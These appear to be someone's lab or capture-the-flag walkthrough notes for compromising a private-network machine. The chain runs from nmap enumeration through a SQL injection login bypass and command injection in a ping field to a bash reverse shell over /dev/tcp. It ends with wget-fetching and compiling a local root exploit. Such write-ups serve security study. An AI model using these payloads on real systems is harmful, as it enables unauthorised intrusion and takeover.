1.) Reconnaissance
  Use arp-scan -l to find host
2.) Enumeration
  Using nmap -A -T4 -p- 192.168.1.108 to find information
  Apache/2.0.52 running on port 80, (CentOS)
  Printer service on 631 it looks like, not sure
  670 has RPC, a protocol that allows a client to execute a function on a server
  MySQL on 3306, presumably some SQLi 
3.) Exploit the website
  Connect to 192.168.1.108, there's a login screen
  Use " admin' OR '1=1 " to get into the administrative web console
  Off this, I see an input field intended to ping a machine on the network
  Use the text box to gain access
4.) Gain Remote Access
  On attacking machine, use nc -lvp 4444 to listen on port 4444
  On target machine, type " ; bash -i >& /dev/tcp/192.168.1.102/4444 0>&1 "
5.) Escalate Privilege 
  Once the shell is caught, type " python3 -m http.server " on attacking machine
    This hosts a python3 server so the target can get the exploit
  Back to target machine, move to /tmp and "wget http://192.168.1.102:8000/9542.c"
    Move to /tmp because it can often be written to by anyone
    This pulls the exploit from the python3 server
  Compile the exploit with gcc -o exploit 9542.c
    Compiles the 9542.c source file into an executable named exploit
  whoami should return root
  
Things Missed:
-----------------------------
Forgot nikto/dirb
